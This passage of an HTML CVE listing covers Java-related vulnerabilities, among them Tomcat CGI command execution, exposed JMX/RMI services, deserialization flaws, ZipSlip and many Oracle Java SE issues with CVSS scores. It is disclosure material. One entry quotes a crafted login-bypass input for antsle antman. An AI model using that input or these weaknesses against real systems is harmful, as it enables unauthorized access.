		<td valign="top">SAML 1.1 SSO Demo Application in SAP NetWeaver Java Application Server (J2EE-APPS), versions 7.10 to 7.11, 7.20, 7.30, 7.31, 7.40 and 7.50, does not sufficiently encode user-controlled inputs, which results in cross-site scripting (XSS) vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0232">CVE-2019-0232</a></td>
		<td valign="top">When running on Windows with enableCmdLineArguments enabled, the CGI Servlet in Apache Tomcat 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39 and 7.0.0 to 7.0.93 is vulnerable to Remote Code Execution due to a bug in the way the JRE passes command line arguments to Windows. The CGI Servlet is disabled by default. The CGI option enableCmdLineArguments is disable by default in Tomcat 9.0.x (and will be disabled by default in all versions in response to this vulnerability). For a detailed explanation of the JRE behaviour, see Markus Wulftange's blog (https://codewhitesec.blogspot.com/2016/02/java-and-command-line-injections-in-windows.html) and this archived MSDN blog (https://web.archive.org/web/20161228144344/https://blogs.msdn.microsoft.com/twistylittlepassagesallalike/2011/04/23/everyone-quotes-command-line-arguments-the-wrong-way/).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0205">CVE-2019-0205</a></td>
		<td valign="top">In Apache Thrift all versions up to and including 0.12.0, a server or client may run into an endless loop when feed with specific input data. Because the issue had already been partially fixed in version 0.11.0, depending on the installed version it affects only certain language bindings.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0195">CVE-2019-0195</a></td>
		<td valign="top">Manipulating classpath asset file URLs, an attacker could guess the path to a known file in the classpath and have it downloaded. If the attacker found the file with the value of the tapestry.hmac-passphrase configuration symbol, most probably the webapp's AppModule class, the value of this symbol could be used to craft a Java deserialization attack, thus running malicious injected Java code. The vector would be the t:formdata parameter from the Form component.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0193">CVE-2019-0193</a></td>
		<td valign="top">In Apache Solr, the DataImportHandler, an optional but popular module to pull in data from databases and other sources, has a feature in which the whole DIH configuration can come from a request's "dataConfig" parameter. The debug mode of the DIH admin screen uses this to allow convenient debugging / development of a DIH config. Since a DIH config can contain scripts, this parameter is a security risk. Starting with version 8.2.0 of Solr, use of this parameter requires setting the Java System property "enable.dih.dataConfigParam" to true.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0189">CVE-2019-0189</a></td>
		<td valign="top">The java.io.ObjectInputStream is known to cause Java serialisation issues. This issue here is exposed by the "webtools/control/httpService" URL, and uses Java deserialization to perform code execution. In the HttpEngine, the value of the request parameter "serviceContext" is passed to the "deserialize" method of "XmlSerializer". Apache Ofbiz is affected via two different dependencies: "commons-beanutils" and an out-dated version of "commons-fileupload" Mitigation: Upgrade to 16.11.06 or manually apply the commits from OFBIZ-10770 and OFBIZ-10837 on branch 16

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-8119">CVE-2018-8119</a></td>
		<td valign="top">A spoofing vulnerability exists when the Azure IoT Device Provisioning AMQP Transport library improperly validates certificates over the AMQP protocol, aka "Azure IoT SDK Spoofing Vulnerability." This affects C# SDK, C SDK, Java SDK.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-8016">CVE-2018-8016</a></td>
		<td valign="top">The default configuration in Apache Cassandra 3.8 through 3.11.1 binds an unauthenticated JMX/RMI interface to all network interfaces, which allows remote attackers to execute arbitrary Java code via an RMI request. This issue is a regression of CVE-2015-0225. The regression was introduced in https://issues.apache.org/jira/browse/CASSANDRA-12109. The fix for the regression is implemented in https://issues.apache.org/jira/browse/CASSANDRA-14173. This fix is contained in the 3.11.2 release of Apache Cassandra.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-8015">CVE-2018-8015</a></td>
		<td valign="top">In Apache ORC 1.0.0 to 1.4.3 a malformed ORC file can trigger an endlessly recursive function call in the C++ or Java parser. The impact of this bug is most likely denial-of-service against software that uses the ORC file parser. With the C++ parser, the stack overflow might possibly corrupt the stack.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-7807">CVE-2018-7807</a></td>
		<td valign="top">Data Center Expert, versions 7.5.0 and earlier, allows for the upload of a zip file from its user interface to the server. A carefully crafted, malicious file could be mistakenly uploaded by an authenticated user via this feature which could contain path traversal file names. As such, it could allow for the arbitrary upload of files contained with the zip onto the server file system outside of the intended directory. This is leveraging the more commonly known ZipSlip vulnerability within Java code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-7806">CVE-2018-7806</a></td>
		<td valign="top">Data Center Operation allows for the upload of a zip file from its user interface to the server. A carefully crafted, malicious file could be mistakenly uploaded by an authenticated user via this feature which could contain path traversal file names. As such, it could allow for the arbitrary upload of files contained with the zip onto the server file system outside of the intended directory. This is leveraging the more commonly known ZipSlip vulnerability within Java code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-7739">CVE-2018-7739</a></td>
		<td valign="top">antsle antman before 0.9.1a allows remote attackers to bypass authentication via invalid characters in the username and password parameters, as demonstrated by a username=&gt;&amp;password=%0a string to the /login URI. This allows obtaining root permissions within the web management console, because the login process uses Java's ProcessBuilder class and a bash script called antsle-auth with insufficient input validation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-6667">CVE-2018-6667</a></td>
		<td valign="top">Authentication Bypass vulnerability in the administrative user interface in McAfee Web Gateway 7.8.1.0 through 7.8.1.5 allows remote attackers to execute arbitrary code via Java management extensions (JMX).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-6331">CVE-2018-6331</a></td>
		<td valign="top">Buck parser-cache command loads/saves state using Java serialized object. If the state information is maliciously crafted, deserializing it could lead to code execution. This issue affects Buck versions prior to v2018.06.25.01.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-5488">CVE-2018-5488</a></td>
		<td valign="top">NetApp SANtricity Web Services Proxy versions 1.10.x000.0002 through 2.12.X000.0002 and SANtricity Storage Manager 11.30.0X00.0004 through 11.42.0X00.0001 ship with the Java Management Extension Remote Method Invocation (JMX RMI) service bound to the network, and are susceptible to unauthenticated remote code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-5487">CVE-2018-5487</a></td>
		<td valign="top">NetApp OnCommand Unified Manager for Linux versions 7.2 through 7.3 ship with the Java Management Extension Remote Method Invocation (JMX RMI) service bound to the network, and are susceptible to unauthenticated remote code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-5486">CVE-2018-5486</a></td>
		<td valign="top">NetApp OnCommand Unified Manager for Linux versions 7.2 though 7.3 ship with the Java Debug Wire Protocol (JDWP) enabled which allows unauthorized local attackers to execute arbitrary code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-5393">CVE-2018-5393</a></td>
		<td valign="top">The TP-LINK EAP Controller is TP-LINK's software for remotely controlling wireless access point devices. It utilizes a Java remote method invocation (RMI) service for remote control. The RMI interface does not require any authentication before use, so it lacks user authentication for RMI service commands in EAP controller versions 2.5.3 and earlier. Remote attackers can implement deserialization attacks through the RMI protocol. Successful attacks may allow a remote attacker to remotely control the target server and execute Java functions or bytecode.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3259">CVE-2018-3259</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 11.2.0.4, 12.1.0.2, 12.2.0.1 and 18c. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java VM. Successful attacks of this vulnerability can result in takeover of Java VM. CVSS 3.0 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3214">CVE-2018-3214</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Sound). Supported versions that are affected are Java SE: 6u201, 7u191 and 8u182; Java SE Embedded: 8u181; JRockit: R28.3.19. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g. through a web service which supplies data to the APIs. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3211">CVE-2018-3211</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Serviceability). Supported versions that are affected are Java SE: 8u182 and 11; Java SE Embedded: 8u181. Easily exploitable vulnerability allows low privileged attacker with logon to the infrastructure where Java SE, Java SE Embedded executes to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded accessible data as well as unauthorized access to critical data or complete access to all Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g. code installed by an administrator). This vulnerability can only be exploited when Java Usage Tracker functionality is being used. CVSS 3.0 Base Score 6.6 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3210">CVE-2018-3210</a></td>
		<td valign="top">Vulnerability in the Oracle GlassFish Server component of Oracle Fusion Middleware (subcomponent: Java Server Faces). The supported version that is affected is 3.1.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle GlassFish Server. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle GlassFish Server accessible data. CVSS 3.0 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3209">CVE-2018-3209</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: JavaFX). The supported version that is affected is Java SE: 8u182. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g. code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g. code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3183">CVE-2018-3183</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Scripting). Supported versions that are affected are Java SE: 8u182 and 11; Java SE Embedded: 8u181; JRockit: R28.3.19. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. While the vulnerability is in Java SE, Java SE Embedded, JRockit, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded, JRockit. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g. code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g. through a web service which supplies data to the APIs. CVSS 3.0 Base Score 9.0 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3180">CVE-2018-3180</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JSSE). Supported versions that are affected are Java SE: 6u201, 7u191, 8u182 and 11; Java SE Embedded: 8u181; JRockit: R28.3.19. Difficult to exploit vulnerability allows unauthenticated attacker with network access via SSL/TLS to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded, JRockit accessible data as well as unauthorized read access to a subset of Java SE, Java SE Embedded, JRockit accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g. code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g. through a web service which supplies data to the APIs. CVSS 3.0 Base Score 5.6 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3169">CVE-2018-3169</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Hotspot). Supported versions that are affected are Java SE: 7u191, 8u182 and 11; Java SE Embedded: 8u181. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g. code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g. code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3157">CVE-2018-3157</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Sound). The supported version that is affected is Java SE: 11. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE accessible data. Note: This vulnerability applies to Java deployments that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3150">CVE-2018-3150</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Utility). The supported version that is affected is Java SE: 11. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE accessible data. Note: This vulnerability applies to Java deployments that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3149">CVE-2018-3149</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JNDI). Supported versions that are affected are Java SE: 6u201, 7u191, 8u182 and 11; Java SE Embedded: 8u181; JRockit: R28.3.19. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, JRockit, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded, JRockit. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g. code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g. through a web service which supplies data to the APIs. CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3139">CVE-2018-3139</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Networking). Supported versions that are affected are Java SE: 6u201, 7u191, 8u182 and 11; Java SE Embedded: 8u181. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g. code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g. code installed by an administrator). CVSS 3.0 Base Score 3.1 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3136">CVE-2018-3136</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 6u201, 7u191, 8u182 and 11; Java SE Embedded: 8u181. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g. code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g. code installed by an administrator). CVSS 3.0 Base Score 3.4 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3110">CVE-2018-3110</a></td>
		<td valign="top">A vulnerability was discovered in the Java VM component of Oracle Database Server. Supported versions that are affected are 11.2.0.4, 12.1.0.2, 12.2.0.1 and 18. Easily exploitable vulnerability allows low privileged attacker having Create Session privilege with network access via Oracle Net to compromise Java VM. While the vulnerability is in Java VM, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java VM. CVSS 3.0 Base Score 9.9 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-3004">CVE-2018-3004</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 11.2.0.4, 12.1.0.2,12.2.0.1 and 18.2. Difficult to exploit vulnerability allows low privileged attacker having Create Session, Create Procedure privilege with network access via multiple protocols to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java VM accessible data. CVSS 3.0 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2973">CVE-2018-2973</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: JSSE). Supported versions that are affected are Java SE: 6u191, 7u181, 8u172 and 10.0.1; Java SE Embedded: 8u171. Difficult to exploit vulnerability allows unauthenticated attacker with network access via SSL/TLS to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 5.9 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2972">CVE-2018-2972</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Security). The supported version that is affected is Java SE: 10.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.9 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2964">CVE-2018-2964</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Deployment). Supported versions that are affected are Java SE: 8u172 and 10.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2952">CVE-2018-2952</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Concurrency). Supported versions that are affected are Java SE: 6u191, 7u181, 8u172 and 10.0.1; Java SE Embedded: 8u171; JRockit: R28.3.18. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2942">CVE-2018-2942</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Windows DLL). Supported versions that are affected are Java SE: 7u181 and 8u172. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2941">CVE-2018-2941</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: JavaFX). Supported versions that are affected are Java SE: 7u181, 8u172 and 10.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2940">CVE-2018-2940</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 6u191, 7u181, 8u172 and 10.0.1; Java SE Embedded: 8u171. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 4.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-2938">CVE-2018-2938</a></td>
